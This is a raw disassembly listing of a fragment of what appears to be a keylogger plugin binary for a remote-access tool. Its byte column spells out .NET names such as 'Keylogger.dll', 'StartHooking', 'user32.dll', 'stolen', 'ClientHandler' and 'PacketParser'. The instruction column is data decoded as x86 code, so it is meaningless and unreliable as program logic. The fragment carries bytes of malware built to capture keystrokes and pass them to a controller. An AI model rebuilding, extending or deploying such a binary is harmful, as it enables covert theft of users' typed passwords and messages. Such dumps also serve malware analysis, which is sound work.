  409cd8:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  409cdf:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  409ce6:	6f                   	outsl  %ds:(%esi),(%dx)
  409ce7:	6d                   	insl   (%dx),%es:(%edi)
  409ce8:	70 69                	jo     0x409d53
  409cea:	6c                   	insb   (%dx),%es:(%edi)
  409ceb:	61                   	popa
  409cec:	74 69                	je     0x409d57
  409cee:	6f                   	outsl  %ds:(%esi),(%dx)
  409cef:	6e                   	outsb  %ds:(%esi),(%dx)
  409cf0:	52                   	push   %edx
  409cf1:	65 6c                	gs insb (%dx),%es:(%edi)
  409cf3:	61                   	popa
  409cf4:	78 61                	js     0x409d57
  409cf6:	74 69                	je     0x409d61
  409cf8:	6f                   	outsl  %ds:(%esi),(%dx)
  409cf9:	6e                   	outsb  %ds:(%esi),(%dx)
  409cfa:	73 41                	jae    0x409d3d
  409cfc:	74 74                	je     0x409d72
  409cfe:	72 69                	jb     0x409d69
  409d00:	62 75 74             	bound  %esi,0x74(%ebp)
  409d03:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409d07:	73 65                	jae    0x409d6e
  409d09:	6d                   	insl   (%dx),%es:(%edi)
  409d0a:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  409d0e:	72 6f                	jb     0x409d7f
  409d10:	64 75 63             	fs jne 0x409d76
  409d13:	74 41                	je     0x409d56
  409d15:	74 74                	je     0x409d8b
  409d17:	72 69                	jb     0x409d82
  409d19:	62 75 74             	bound  %esi,0x74(%ebp)
  409d1c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409d20:	73 65                	jae    0x409d87
  409d22:	6d                   	insl   (%dx),%es:(%edi)
  409d23:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409d27:	6f                   	outsl  %ds:(%esi),(%dx)
  409d28:	70 79                	jo     0x409da3
  409d2a:	72 69                	jb     0x409d95
  409d2c:	67 68 74 41 74 74    	addr16 push $0x74744174
  409d32:	72 69                	jb     0x409d9d
  409d34:	62 75 74             	bound  %esi,0x74(%ebp)
  409d37:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409d3b:	73 65                	jae    0x409da2
  409d3d:	6d                   	insl   (%dx),%es:(%edi)
  409d3e:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409d42:	6f                   	outsl  %ds:(%esi),(%dx)
  409d43:	6d                   	insl   (%dx),%es:(%edi)
  409d44:	70 61                	jo     0x409da7
  409d46:	6e                   	outsb  %ds:(%esi),(%dx)
  409d47:	79 41                	jns    0x409d8a
  409d49:	74 74                	je     0x409dbf
  409d4b:	72 69                	jb     0x409db6
  409d4d:	62 75 74             	bound  %esi,0x74(%ebp)
  409d50:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  409d54:	6e                   	outsb  %ds:(%esi),(%dx)
  409d55:	74 69                	je     0x409dc0
  409d57:	6d                   	insl   (%dx),%es:(%edi)
  409d58:	65 43                	gs inc %ebx
  409d5a:	6f                   	outsl  %ds:(%esi),(%dx)
  409d5b:	6d                   	insl   (%dx),%es:(%edi)
  409d5c:	70 61                	jo     0x409dbf
  409d5e:	74 69                	je     0x409dc9
  409d60:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  409d63:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  409d6a:	69 
  409d6b:	62 75 74             	bound  %esi,0x74(%ebp)
  409d6e:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  409d72:	74 65                	je     0x409dd9
  409d74:	00 54 72 79          	add    %dl,0x79(%edx,%esi,2)
  409d78:	47                   	inc    %edi
  409d79:	65 74 56             	gs je  0x409dd2
  409d7c:	61                   	popa
  409d7d:	6c                   	insb   (%dx),%es:(%edi)
  409d7e:	75 65                	jne    0x409de5
  409d80:	00 76 61             	add    %dh,0x61(%esi)
  409d83:	6c                   	insb   (%dx),%es:(%edi)
  409d84:	75 65                	jne    0x409deb
  409d86:	00 52 65             	add    %dl,0x65(%edx)
  409d89:	63 65 69             	arpl   %esp,0x69(%ebp)
  409d8c:	76 65                	jbe    0x409df3
  409d8e:	00 61 64             	add    %ah,0x64(%ecx)
  409d91:	64 5f                	fs pop %edi
  409d93:	41                   	inc    %ecx
  409d94:	73 73                	jae    0x409e09
  409d96:	65 6d                	gs insl (%dx),%es:(%edi)
  409d98:	62 6c 79 52          	bound  %ebp,0x52(%ecx,%edi,2)
  409d9c:	65 73 6f             	gs jae 0x409e0e
  409d9f:	6c                   	insb   (%dx),%es:(%edi)
  409da0:	76 65                	jbe    0x409e07
  409da2:	00 63 63             	add    %ah,0x63(%ebx)
  409da5:	68 42 75 66 66       	push   $0x66667542
  409daa:	00 70 77             	add    %dh,0x77(%eax)
  409dad:	73 7a                	jae    0x409e29
  409daf:	42                   	inc    %edx
  409db0:	75 66                	jne    0x409e18
  409db2:	66 00 53 79          	data16 add %dl,0x79(%ebx)
  409db6:	73 74                	jae    0x409e2c
  409db8:	65 6d                	gs insl (%dx),%es:(%edi)
  409dba:	2e 54                	cs push %esp
  409dbc:	68 72 65 61 64       	push   $0x64616572
  409dc1:	69 6e 67 00 53 74 61 	imul   $0x61745300,0x67(%esi),%ebp
  409dc8:	72 74                	jb     0x409e3e
  409dca:	48                   	dec    %eax
  409dcb:	6f                   	outsl  %ds:(%esi),(%dx)
  409dcc:	6f                   	outsl  %ds:(%esi),(%dx)
  409dcd:	6b 69 6e 67          	imul   $0x67,0x6e(%ecx),%ebp
  409dd1:	00 53 79             	add    %dl,0x79(%ebx)
  409dd4:	73 74                	jae    0x409e4a
  409dd6:	65 6d                	gs insl (%dx),%es:(%edi)
  409dd8:	2e 52                	cs push %edx
  409dda:	75 6e                	jne    0x409e4a
  409ddc:	74 69                	je     0x409e47
  409dde:	6d                   	insl   (%dx),%es:(%edi)
  409ddf:	65 2e 56             	gs cs push %esi
  409de2:	65 72 73             	gs jb  0x409e58
  409de5:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  409dec:	54                   	push   %esp
  409ded:	6f                   	outsl  %ds:(%esi),(%dx)
  409dee:	53                   	push   %ebx
  409def:	68 6f 72 74 54       	push   $0x5474726f
  409df4:	69 6d 65 53 74 72 69 	imul   $0x69727453,0x65(%ebp),%ebp
  409dfb:	6e                   	outsb  %ds:(%esi),(%dx)
  409dfc:	67 00 43 75          	add    %al,0x75(%bp,%di)
  409e00:	6c                   	insb   (%dx),%es:(%edi)
  409e01:	74 75                	je     0x409e78
  409e03:	72 65                	jb     0x409e6a
  409e05:	54                   	push   %esp
  409e06:	6f                   	outsl  %ds:(%esi),(%dx)
  409e07:	53                   	push   %ebx
  409e08:	74 72                	je     0x409e7c
  409e0a:	69 6e 67 00 41 74 74 	imul   $0x74744100,0x67(%esi),%ebp
  409e11:	61                   	popa
  409e12:	63 68 00             	arpl   %ebp,0x0(%eax)
  409e15:	4c                   	dec    %esp
  409e16:	61                   	popa
  409e17:	75 6e                	jne    0x409e87
  409e19:	63 68 00             	arpl   %ebp,0x0(%eax)
  409e1c:	67 65 74 5f          	addr16 gs je 0x409e7f
  409e20:	4c                   	dec    %esp
  409e21:	65 6e                	outsb  %gs:(%esi),(%dx)
  409e23:	67 74 68             	addr16 je 0x409e8e
  409e26:	00 45 6e             	add    %al,0x6e(%ebp)
  409e29:	64 73 57             	fs jae 0x409e83
  409e2c:	69 74 68 00 41 73 79 	imul   $0x6e797341,0x0(%eax,%ebp,2),%esi
  409e33:	6e 
  409e34:	63 43 61             	arpl   %eax,0x61(%ebx)
  409e37:	6c                   	insb   (%dx),%es:(%edi)
  409e38:	6c                   	insb   (%dx),%es:(%edi)
  409e39:	62 61 63             	bound  %esp,0x63(%ecx)
  409e3c:	6b 00 63             	imul   $0x63,(%eax),%eax
  409e3f:	61                   	popa
  409e40:	6c                   	insb   (%dx),%es:(%edi)
  409e41:	6c                   	insb   (%dx),%es:(%edi)
  409e42:	62 61 63             	bound  %esp,0x63(%ecx)
  409e45:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  409e48:	75 6c                	jne    0x409eb6
  409e4a:	6c                   	insb   (%dx),%es:(%edi)
  409e4b:	43                   	inc    %ebx
  409e4c:	61                   	popa
  409e4d:	63 68 65             	arpl   %ebp,0x65(%eax)
  409e50:	4c                   	dec    %esp
  409e51:	6f                   	outsl  %ds:(%esi),(%dx)
  409e52:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  409e55:	68 68 6b 00 70       	push   $0x70006b68
  409e5a:	74 72                	je     0x409ece
  409e5c:	48                   	dec    %eax
  409e5d:	6f                   	outsl  %ds:(%esi),(%dx)
  409e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  409e5f:	6b 00 41             	imul   $0x41,(%eax),%eax
  409e62:	62 6f 72             	bound  %ebp,0x72(%edi)
  409e65:	74 48                	je     0x409eaf
  409e67:	6f                   	outsl  %ds:(%esi),(%dx)
  409e68:	6f                   	outsl  %ds:(%esi),(%dx)
  409e69:	6b 00 68             	imul   $0x68,(%eax),%eax
  409e6c:	6f                   	outsl  %ds:(%esi),(%dx)
  409e6d:	6f                   	outsl  %ds:(%esi),(%dx)
  409e6e:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  409e71:	61                   	popa
  409e72:	72 73                	jb     0x409ee7
  409e74:	68 61 6c 00 53       	push   $0x53006c61
  409e79:	6f                   	outsl  %ds:(%esi),(%dx)
  409e7a:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409e7d:	74 4f                	je     0x409ece
  409e7f:	70 74                	jo     0x409ef5
  409e81:	69 6f 6e 4c 65 76 65 	imul   $0x6576654c,0x6e(%edi),%ebp
  409e88:	6c                   	insb   (%dx),%es:(%edi)
  409e89:	00 64 77 68          	add    %ah,0x68(%edi,%esi,2)
  409e8d:	6b 6c 00 75 73       	imul   $0x73,0x75(%eax,%eax,1),%ebp
  409e92:	65 72 33             	gs jb  0x409ec8
  409e95:	32 2e                	xor    (%esi),%ch
  409e97:	64 6c                	fs insb (%dx),%es:(%edi)
  409e99:	6c                   	insb   (%dx),%es:(%edi)
  409e9a:	00 4b 65             	add    %cl,0x65(%ebx)
  409e9d:	79 6c                	jns    0x409f0b
  409e9f:	6f                   	outsl  %ds:(%esi),(%dx)
  409ea0:	67 67 65 72 2e       	addr16 addr16 gs jb 0x409ed3
  409ea5:	64 6c                	fs insb (%dx),%es:(%edi)
  409ea7:	6c                   	insb   (%dx),%es:(%edi)
  409ea8:	00 50 6f             	add    %dl,0x6f(%eax)
  409eab:	6c                   	insb   (%dx),%es:(%edi)
  409eac:	6c                   	insb   (%dx),%es:(%edi)
  409ead:	00 52 65             	add    %dl,0x65(%edx)
  409eb0:	61                   	popa
  409eb1:	64 53                	fs push %ebx
  409eb3:	74 72                	je     0x409f27
  409eb5:	65 61                	gs popa
  409eb7:	6d                   	insl   (%dx),%es:(%edi)
  409eb8:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  409ebc:	64 53                	fs push %ebx
  409ebe:	74 72                	je     0x409f32
  409ec0:	65 61                	gs popa
  409ec2:	6d                   	insl   (%dx),%es:(%edi)
  409ec3:	00 47 65             	add    %al,0x65(%edi)
  409ec6:	74 4d                	je     0x409f15
  409ec8:	61                   	popa
  409ec9:	6e                   	outsb  %ds:(%esi),(%dx)
  409eca:	69 66 65 73 74 52 65 	imul   $0x65527473,0x65(%esi),%esp
  409ed1:	73 6f                	jae    0x409f42
  409ed3:	75 72                	jne    0x409f47
  409ed5:	63 65 53             	arpl   %esp,0x53(%ebp)
  409ed8:	74 72                	je     0x409f4c
  409eda:	65 61                	gs popa
  409edc:	6d                   	insl   (%dx),%es:(%edi)
  409edd:	00 44 65 66          	add    %al,0x66(%ebp,%eiz,2)
  409ee1:	6c                   	insb   (%dx),%es:(%edi)
  409ee2:	61                   	popa
  409ee3:	74 65                	je     0x409f4a
  409ee5:	53                   	push   %ebx
  409ee6:	74 72                	je     0x409f5a
  409ee8:	65 61                	gs popa
  409eea:	6d                   	insl   (%dx),%es:(%edi)
  409eeb:	00 4d 65             	add    %cl,0x65(%ebp)
  409eee:	6d                   	insl   (%dx),%es:(%edi)
  409eef:	6f                   	outsl  %ds:(%esi),(%dx)
  409ef0:	72 79                	jb     0x409f6b
  409ef2:	53                   	push   %ebx
  409ef3:	74 72                	je     0x409f67
  409ef5:	65 61                	gs popa
  409ef7:	6d                   	insl   (%dx),%es:(%edi)
  409ef8:	00 73 74             	add    %dh,0x74(%ebx)
  409efb:	72 65                	jb     0x409f62
  409efd:	61                   	popa
  409efe:	6d                   	insl   (%dx),%es:(%edi)
  409eff:	00 6c 50 61          	add    %ch,0x61(%eax,%edx,2)
  409f03:	72 61                	jb     0x409f66
  409f05:	6d                   	insl   (%dx),%es:(%edi)
  409f06:	00 77 50             	add    %dh,0x50(%edi)
  409f09:	61                   	popa
  409f0a:	72 61                	jb     0x409f6d
  409f0c:	6d                   	insl   (%dx),%es:(%edi)
  409f0d:	00 73 65             	add    %dh,0x65(%ebx)
  409f10:	74 5f                	je     0x409f71
  409f12:	49                   	dec    %ecx
  409f13:	74 65                	je     0x409f7a
  409f15:	6d                   	insl   (%dx),%es:(%edi)
  409f16:	00 53 79             	add    %dl,0x79(%ebx)
  409f19:	73 74                	jae    0x409f8f
  409f1b:	65 6d                	gs insl (%dx),%es:(%edi)
  409f1d:	00 73 74             	add    %dh,0x74(%ebx)
  409f20:	6f                   	outsl  %ds:(%esi),(%dx)
  409f21:	6c                   	insb   (%dx),%es:(%edi)
  409f22:	65 6e                	outsb  %gs:(%esi),(%dx)
  409f24:	00 4d 61             	add    %cl,0x61(%ebp)
  409f27:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  409f2e:	6f                   	outsl  %ds:(%esi),(%dx)
  409f2f:	6d                   	insl   (%dx),%es:(%edi)
  409f30:	61                   	popa
  409f31:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  409f38:	43                   	inc    %ebx
  409f39:	75 72                	jne    0x409fad
  409f3b:	72 65                	jb     0x409fa2
  409f3d:	6e                   	outsb  %ds:(%esi),(%dx)
  409f3e:	74 44                	je     0x409f84
  409f40:	6f                   	outsl  %ds:(%esi),(%dx)
  409f41:	6d                   	insl   (%dx),%es:(%edi)
  409f42:	61                   	popa
  409f43:	69 6e 00 50 6c 75 67 	imul   $0x67756c50,0x0(%esi),%ebp
  409f4a:	69 6e 00 46 6f 64 79 	imul   $0x79646f46,0x0(%esi),%ebp
  409f51:	56                   	push   %esi
  409f52:	65 72 73             	gs jb  0x409fc8
  409f55:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  409f5c:	74 65                	je     0x409fc3
  409f5e:	6d                   	insl   (%dx),%es:(%edi)
  409f5f:	2e 49                	cs dec %ecx
  409f61:	4f                   	dec    %edi
  409f62:	2e 43                	cs inc %ebx
  409f64:	6f                   	outsl  %ds:(%esi),(%dx)
  409f65:	6d                   	insl   (%dx),%es:(%edi)
  409f66:	70 72                	jo     0x409fda
  409f68:	65 73 73             	gs jae 0x409fde
  409f6b:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  409f72:	6c                   	insb   (%dx),%es:(%edi)
  409f73:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  409f7a:	00 64 65 73          	add    %ah,0x73(%ebp,%eiz,2)
  409f7e:	74 69                	je     0x409fe9
  409f80:	6e                   	outsb  %ds:(%esi),(%dx)
  409f81:	61                   	popa
  409f82:	74 69                	je     0x409fed
  409f84:	6f                   	outsl  %ds:(%esi),(%dx)
  409f85:	6e                   	outsb  %ds:(%esi),(%dx)
  409f86:	00 53 79             	add    %dl,0x79(%ebx)
  409f89:	73 74                	jae    0x409fff
  409f8b:	65 6d                	gs insl (%dx),%es:(%edi)
  409f8d:	2e 47                	cs inc %edi
  409f8f:	6c                   	insb   (%dx),%es:(%edi)
  409f90:	6f                   	outsl  %ds:(%esi),(%dx)
  409f91:	62 61 6c             	bound  %esp,0x6c(%ecx)
  409f94:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  409f9b:	00 53 79             	add    %dl,0x79(%ebx)
  409f9e:	73 74                	jae    0x40a014
  409fa0:	65 6d                	gs insl (%dx),%es:(%edi)
  409fa2:	2e 52                	cs push %edx
  409fa4:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  409fa7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409fac:	6e                   	outsb  %ds:(%esi),(%dx)
  409fad:	00 73 65             	add    %dh,0x65(%ebx)
  409fb0:	74 5f                	je     0x40a011
  409fb2:	50                   	push   %eax
  409fb3:	6f                   	outsl  %ds:(%esi),(%dx)
  409fb4:	73 69                	jae    0x40a01f
  409fb6:	74 69                	je     0x40a021
  409fb8:	6f                   	outsl  %ds:(%esi),(%dx)
  409fb9:	6e                   	outsb  %ds:(%esi),(%dx)
  409fba:	00 53 65             	add    %dl,0x65(%ebx)
  409fbd:	74 53                	je     0x40a012
  409fbf:	6f                   	outsl  %ds:(%esi),(%dx)
  409fc0:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409fc3:	74 4f                	je     0x40a014
  409fc5:	70 74                	jo     0x40a03b
  409fc7:	69 6f 6e 00 45 78 63 	imul   $0x63784500,0x6e(%edi),%ebp
  409fce:	65 70 74             	gs jo  0x40a045
  409fd1:	69 6f 6e 00 53 74 72 	imul   $0x72745300,0x6e(%edi),%ebp
  409fd8:	69 6e 67 43 6f 6d 70 	imul   $0x706d6f43,0x67(%esi),%ebp
  409fdf:	61                   	popa
  409fe0:	72 69                	jb     0x40a04b
  409fe2:	73 6f                	jae    0x40a053
  409fe4:	6e                   	outsb  %ds:(%esi),(%dx)
  409fe5:	00 52 75             	add    %dl,0x75(%edx)
  409fe8:	6e                   	outsb  %ds:(%esi),(%dx)
  409fe9:	00 43 6f             	add    %al,0x6f(%ebx)
  409fec:	70 79                	jo     0x40a067
  409fee:	54                   	push   %esp
  409fef:	6f                   	outsl  %ds:(%esi),(%dx)
  409ff0:	00 67 65             	add    %ah,0x65(%edi)
  409ff3:	74 5f                	je     0x40a054
  409ff5:	43                   	inc    %ebx
  409ff6:	75 6c                	jne    0x40a064
  409ff8:	74 75                	je     0x40a06f
  409ffa:	72 65                	jb     0x40a061
  409ffc:	49                   	dec    %ecx
  409ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  409ffe:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a000:	00 5a 65             	add    %bl,0x65(%edx)
  40a003:	72 6f                	jb     0x40a074
  40a005:	00 67 65             	add    %ah,0x65(%edi)
  40a008:	74 5f                	je     0x40a069
  40a00a:	62 61 73             	bound  %esp,0x73(%ecx)
  40a00d:	65 49                	gs dec %ecx
  40a00f:	70 00                	jo     0x40a011
  40a011:	73 65                	jae    0x40a078
  40a013:	74 5f                	je     0x40a074
  40a015:	62 61 73             	bound  %esp,0x73(%ecx)
  40a018:	65 49                	gs dec %ecx
  40a01a:	70 00                	jo     0x40a01c
  40a01c:	6c                   	insb   (%dx),%es:(%edi)
  40a01d:	70 00                	jo     0x40a01f
  40a01f:	77 70                	ja     0x40a091
  40a021:	00 61 72             	add    %ah,0x72(%ecx)
  40a024:	00 41 73             	add    %al,0x73(%ecx)
  40a027:	73 65                	jae    0x40a08e
  40a029:	6d                   	insl   (%dx),%es:(%edi)
  40a02a:	62 6c 79 4c          	bound  %ebp,0x4c(%ecx,%edi,2)
  40a02e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a02f:	61                   	popa
  40a030:	64 65 72 00          	fs gs jb 0x40a034
  40a034:	53                   	push   %ebx
  40a035:	74 72                	je     0x40a0a9
  40a037:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  40a03e:	64 65 72 00          	fs gs jb 0x40a042
  40a042:	73 65                	jae    0x40a0a9
  40a044:	6e                   	outsb  %ds:(%esi),(%dx)
  40a045:	64 65 72 00          	fs gs jb 0x40a049
  40a049:	4b                   	dec    %ebx
  40a04a:	65 79 6c             	gs jns 0x40a0b9
  40a04d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a04e:	67 67 65 72 00       	addr16 addr16 gs jb 0x40a053
  40a053:	43                   	inc    %ebx
  40a054:	6c                   	insb   (%dx),%es:(%edi)
  40a055:	69 65 6e 74 48 61 6e 	imul   $0x6e614874,0x6e(%ebp),%esp
  40a05c:	64 6c                	fs insb (%dx),%es:(%edi)
  40a05e:	65 72 00             	gs jb  0x40a061
  40a061:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40a065:	6e                   	outsb  %ds:(%esi),(%dx)
  40a066:	74 48                	je     0x40a0b0
  40a068:	61                   	popa
  40a069:	6e                   	outsb  %ds:(%esi),(%dx)
  40a06a:	64 6c                	fs insb (%dx),%es:(%edi)
  40a06c:	65 72 00             	gs jb  0x40a06f
  40a06f:	52                   	push   %edx
  40a070:	65 73 6f             	gs jae 0x40a0e2
  40a073:	6c                   	insb   (%dx),%es:(%edi)
  40a074:	76 65                	jbe    0x40a0db
  40a076:	45                   	inc    %ebp
  40a077:	76 65                	jbe    0x40a0de
  40a079:	6e                   	outsb  %ds:(%esi),(%dx)
  40a07a:	74 48                	je     0x40a0c4
  40a07c:	61                   	popa
  40a07d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a07e:	64 6c                	fs insb (%dx),%es:(%edi)
  40a080:	65 72 00             	gs jb  0x40a083
  40a083:	54                   	push   %esp
  40a084:	6f                   	outsl  %ds:(%esi),(%dx)
  40a085:	55                   	push   %ebp
  40a086:	70 70                	jo     0x40a0f8
  40a088:	65 72 00             	gs jb  0x40a08b
  40a08b:	50                   	push   %eax
  40a08c:	61                   	popa
  40a08d:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a090:	74 50                	je     0x40a0e2
  40a092:	61                   	popa
  40a093:	72 73                	jb     0x40a108
  40a095:	65 72 00             	gs jb  0x40a098
  40a098:	45                   	inc    %ebp
  40a099:	6e                   	outsb  %ds:(%esi),(%dx)
  40a09a:	74 65                	je     0x40a101
  40a09c:	72 00                	jb     0x40a09e
  40a09e:	42                   	inc    %edx
  40a09f:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  40a0a6:	72 
  40a0a7:	74 65                	je     0x40a10e
  40a0a9:	72 00                	jb     0x40a0ab
  40a0ab:	54                   	push   %esp
  40a0ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0ad:	4c                   	dec    %esp
  40a0ae:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0af:	77 65                	ja     0x40a116
  40a0b1:	72 00                	jb     0x40a0b3
  40a0b3:	53                   	push   %ebx
  40a0b4:	65 72 69             	gs jb  0x40a120
  40a0b7:	61                   	popa
  40a0b8:	6c                   	insb   (%dx),%es:(%edi)
  40a0b9:	69 7a 65 72 00 2e 63 	imul   $0x632e0072,0x65(%edx),%edi
  40a0c0:	74 6f                	je     0x40a131
  40a0c2:	72 00                	jb     0x40a0c4
  40a0c4:	2e 63 63 74          	arpl   %esp,%cs:0x74(%ebx)
  40a0c8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0c9:	72 00                	jb     0x40a0cb
  40a0cb:	4d                   	dec    %ebp
  40a0cc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0cd:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0ce:	69 74 6f 72 00 49 6e 	imul   $0x746e4900,0x72(%edi,%ebp,2),%esi
  40a0d5:	74 
  40a0d6:	50                   	push   %eax
  40a0d7:	74 72                	je     0x40a14b
  40a0d9:	00 53 79             	add    %dl,0x79(%ebx)
  40a0dc:	73 74                	jae    0x40a152
  40a0de:	65 6d                	gs insl (%dx),%es:(%edi)
  40a0e0:	2e 44                	cs inc %esp
  40a0e2:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40a0e9:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  40a0f0:	74 65                	je     0x40a157
  40a0f2:	6d                   	insl   (%dx),%es:(%edi)
  40a0f3:	2e 52                	cs push %edx
  40a0f5:	75 6e                	jne    0x40a165
  40a0f7:	74 69                	je     0x40a162
  40a0f9:	6d                   	insl   (%dx),%es:(%edi)
  40a0fa:	65 2e 49             	gs cs dec %ecx
  40a0fd:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0fe:	74 65                	je     0x40a165
  40a100:	72 6f                	jb     0x40a171
  40a102:	70 53                	jo     0x40a157
  40a104:	65 72 76             	gs jb  0x40a17d
  40a107:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40a10e:	73 74                	jae    0x40a184
  40a110:	65 6d                	gs insl (%dx),%es:(%edi)
  40a112:	2e 52                	cs push %edx
  40a114:	75 6e                	jne    0x40a184
  40a116:	74 69                	je     0x40a181
  40a118:	6d                   	insl   (%dx),%es:(%edi)
  40a119:	65 2e 43             	gs cs inc %ebx
  40a11c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a11d:	6d                   	insl   (%dx),%es:(%edi)
  40a11e:	70 69                	jo     0x40a189
  40a120:	6c                   	insb   (%dx),%es:(%edi)
  40a121:	65 72 53             	gs jb  0x40a177
  40a124:	65 72 76             	gs jb  0x40a19d
  40a127:	69 63 65 73 00 52 65 	imul   $0x65520073,0x65(%ebx),%esp
  40a12e:	61                   	popa
  40a12f:	64 46                	fs inc %esi
  40a131:	72 6f                	jb     0x40a1a2
  40a133:	6d                   	insl   (%dx),%es:(%edi)
  40a134:	45                   	inc    %ebp
  40a135:	6d                   	insl   (%dx),%es:(%edi)
  40a136:	62 65 64             	bound  %esp,0x64(%ebp)
  40a139:	64 65 64 52          	fs gs fs push %edx
  40a13d:	65 73 6f             	gs jae 0x40a1af
  40a140:	75 72                	jne    0x40a1b4
  40a142:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a145:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  40a149:	75 67                	jne    0x40a1b2
  40a14b:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  40a152:	65 
  40a153:	73 00                	jae    0x40a155
  40a155:	47                   	inc    %edi
  40a156:	65 74 41             	gs je  0x40a19a
  40a159:	73 73                	jae    0x40a1ce
  40a15b:	65 6d                	gs insl (%dx),%es:(%edi)
  40a15d:	62 6c 69 65          	bound  %ebp,0x65(%ecx,%ebp,2)
  40a161:	73 00                	jae    0x40a163
  40a163:	72 65                	jb     0x40a1ca
  40a165:	73 6f                	jae    0x40a1d6
  40a167:	75 72                	jne    0x40a1db
  40a169:	63 65 4e             	arpl   %esp,0x4e(%ebp)
  40a16c:	61                   	popa
  40a16d:	6d                   	insl   (%dx),%es:(%edi)
  40a16e:	65 73 00             	gs jae 0x40a171
  40a171:	73 79                	jae    0x40a1ec
  40a173:	6d                   	insl   (%dx),%es:(%edi)
  40a174:	62 6f 6c             	bound  %ebp,0x6c(%edi)
  40a177:	4e                   	dec    %esi
  40a178:	61                   	popa
  40a179:	6d                   	insl   (%dx),%es:(%edi)
  40a17a:	65 73 00             	gs jae 0x40a17d
  40a17d:	61                   	popa
  40a17e:	73 73                	jae    0x40a1f3
  40a180:	65 6d                	gs insl (%dx),%es:(%edi)
  40a182:	62 6c 79 4e          	bound  %ebp,0x4e(%ecx,%edi,2)
  40a186:	61                   	popa
  40a187:	6d                   	insl   (%dx),%es:(%edi)
  40a188:	65 73 00             	gs jae 0x40a18b
  40a18b:	47                   	inc    %edi
  40a18c:	65 74 42             	gs je  0x40a1d1
  40a18f:	79 74                	jns    0x40a205
  40a191:	65 73 00             	gs jae 0x40a194
  40a194:	67 65 74 5f          	addr16 gs je 0x40a1f7
  40a198:	46                   	inc    %esi
  40a199:	6c                   	insb   (%dx),%es:(%edi)
  40a19a:	61                   	popa
  40a19b:	67 73 00             	addr16 jae 0x40a19e
  40a19e:	41                   	inc    %ecx
  40a19f:	73 73                	jae    0x40a214
  40a1a1:	65 6d                	gs insl (%dx),%es:(%edi)
  40a1a3:	62 6c 79 4e          	bound  %ebp,0x4e(%ecx,%edi,2)
  40a1a7:	61                   	popa
  40a1a8:	6d                   	insl   (%dx),%es:(%edi)
  40a1a9:	65 46                	gs inc %esi
  40a1ab:	6c                   	insb   (%dx),%es:(%edi)
  40a1ac:	61                   	popa
  40a1ad:	67 73 00             	addr16 jae 0x40a1b0
  40a1b0:	53                   	push   %ebx
  40a1b1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1b2:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a1b5:	74 46                	je     0x40a1fd
  40a1b7:	6c                   	insb   (%dx),%es:(%edi)
  40a1b8:	61                   	popa
  40a1b9:	67 73 00             	addr16 jae 0x40a1bc
  40a1bc:	77 46                	ja     0x40a204
  40a1be:	6c                   	insb   (%dx),%es:(%edi)
  40a1bf:	61                   	popa
  40a1c0:	67 73 00             	addr16 jae 0x40a1c3
  40a1c3:	66 6c                	data16 insb (%dx),%es:(%edi)
  40a1c5:	61                   	popa
  40a1c6:	67 73 00             	addr16 jae 0x40a1c9
  40a1c9:	52                   	push   %edx
  40a1ca:	65 73 6f             	gs jae 0x40a23c
  40a1cd:	6c                   	insb   (%dx),%es:(%edi)
  40a1ce:	76 65                	jbe    0x40a235
  40a1d0:	45                   	inc    %ebp
  40a1d1:	76 65                	jbe    0x40a238
